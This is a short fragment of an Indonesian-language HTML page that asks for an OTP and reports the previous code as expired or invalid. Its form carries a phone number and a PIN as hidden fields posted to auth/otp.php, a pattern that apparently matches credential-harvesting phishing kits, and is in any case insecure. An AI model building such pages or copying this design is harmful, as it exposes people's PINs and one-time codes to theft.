...
<body>
    ...
    <div class="background">
        <div class="container" id="container">
            <center>
                <h1>Masukkan OTP</h1>
                <h2 style="color: red; font-weight:lighter; ">Kode OTP Telah Kedaluwarsa atau Invalid<br> Silahkan Kirim Ulang Kode OTP Baru.</h2>
                <form action="auth/otp.php" method="post">
                    ...
                    <input type="hidden" name="nomor" value="54666666666666" />
                    <input type="hidden" name="pin" value="46565" />
                </form>
